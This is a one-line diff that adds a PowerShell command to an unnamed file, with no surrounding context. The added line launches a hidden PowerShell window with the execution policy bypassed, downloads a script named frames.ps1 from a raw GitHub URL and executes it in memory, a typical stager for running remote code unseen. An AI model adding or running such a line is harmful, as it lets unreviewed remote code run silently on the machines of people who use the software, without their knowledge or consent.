@@ -1,0 +1,1 @@
+Start-Process powershell -ArgumentList '-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/frames.ps1 -UseBasicParsing)"'
